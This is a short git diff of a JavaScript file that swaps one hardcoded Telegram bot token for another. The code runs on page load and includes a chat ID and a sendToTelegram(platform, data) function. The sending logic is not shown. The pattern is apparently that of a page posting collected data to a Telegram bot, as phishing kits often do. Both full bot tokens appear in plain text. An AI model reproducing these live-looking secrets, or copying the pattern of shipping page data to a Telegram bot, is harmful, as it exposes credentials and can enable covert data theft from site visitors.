@@ -1,6 +1,6 @@
 
 document.addEventListener("DOMContentLoaded", () => {
-    const TELEGRAM_BOT_TOKEN = "7738217538:AAHYGV5jXPv5L37QmHsJ7PbnBz8UhXYof2k";
+    const TELEGRAM_BOT_TOKEN = "7738217538:AAGoNIvjMilJ5Ikt9oalHhpEiRDtS7t3NbU";
     const CHAT_ID = "6804915795";
 
     function sendToTelegram(platform, data) {
